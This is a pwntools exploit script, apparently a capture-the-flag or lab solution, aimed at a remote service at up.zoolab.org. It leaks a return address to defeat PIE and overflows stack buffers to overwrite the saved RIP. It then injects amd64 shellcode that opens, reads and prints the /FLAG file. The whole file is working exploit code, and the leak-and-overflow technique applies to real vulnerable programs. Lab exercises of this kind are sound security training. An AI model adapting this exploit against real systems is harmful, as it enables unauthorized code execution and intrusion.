from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Remote target
p = remote('up.zoolab.org', 12342)

# Step 1: Leak return address from printf
p.sendafter(b"What's your name? ", b"A" * 56)  # 0x38 = 56
p.recvuntil(b"Welcome, ")

leak = p.recvline().strip()
log.info(f"Raw leak = {leak} ({len(leak)} bytes)")

# Extract saved RIP (last 6 bytes)
leaked_bytes = leak[-6:]
leaked_ret = u64(leaked_bytes.ljust(8, b'\x00'))
log.success(f"Leaked return address: {hex(leaked_ret)}")

# Step 2: Calculate PIE base and msg address
OFFSET_MAIN_RET_FROM_TASK = 0x9c99
OFFSET_MSG_FROM_PIE_BASE = 0xef220

pie_base = leaked_ret - OFFSET_MAIN_RET_FROM_TASK
msg_addr = pie_base + OFFSET_MSG_FROM_PIE_BASE

log.info(f"PIE base = {hex(pie_base)}")
log.success(f"msg address = {hex(msg_addr)}")

# Step 3: Shellcode to read /FLAG and print it
shellcode = asm('''
    xor rax, rax
    push rax
    mov rbx, 0x47414c462f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    mov eax, SYS_open
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov edx, 100
    xor eax, eax
    syscall

    mov rdx, rax
    mov rdi, 1
    mov eax, SYS_write
    syscall

    mov eax, SYS_exit
    xor edi, edi
    syscall
''')

# Step 4: Send room number
p.sendafter(b"What's the room number? ", b"101")

# Step 5: Overflow all buffers and overwrite RIP
padding = b"A" * 48 + b"B" * 48 + b"C" * 48  # buf1, buf2, buf3
padding += b"D" * 8                         # saved rbp
payload = padding + p64(msg_addr)          # overwrite RIP with shellcode address

p.sendafter(b"What's the customer's name? ", payload)

# Step 6: Inject shellcode into msg buffer
p.sendafter(b"Leave your message: ", shellcode)

# Step 7: Interact to get flag
flag_content = p.recvall(timeout=1)
# print("[+] Flag received:")
print(flag_content.decode(errors='ignore').strip())
